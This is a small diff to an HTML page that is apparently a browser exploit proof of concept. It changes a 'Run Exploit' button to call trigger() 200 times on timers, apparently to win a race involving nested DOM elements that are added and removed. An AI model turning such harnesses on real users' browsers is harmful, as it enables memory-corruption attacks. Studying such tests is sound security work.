@@ -31,7 +31,7 @@
     </style>
 </head>
 <body>
-    <button onclick="trigger()">Run Exploit</button>
+    <button onclick="startLoop()">Run Exploit</button>
     <div class="outer" id="outer">
         <div class="inner" id="inner">
             <div class="child" id="child"></div>
@@ -65,6 +65,12 @@
                     inner.removeChild(newDiv);
                 }, 5);
             }, 5);
+        }
+
+        function startLoop() {
+            for (let i = 0; i < 200; i++) {
+                setTimeout(trigger, i * 50);
+            }
         }
     </script>
 </body>
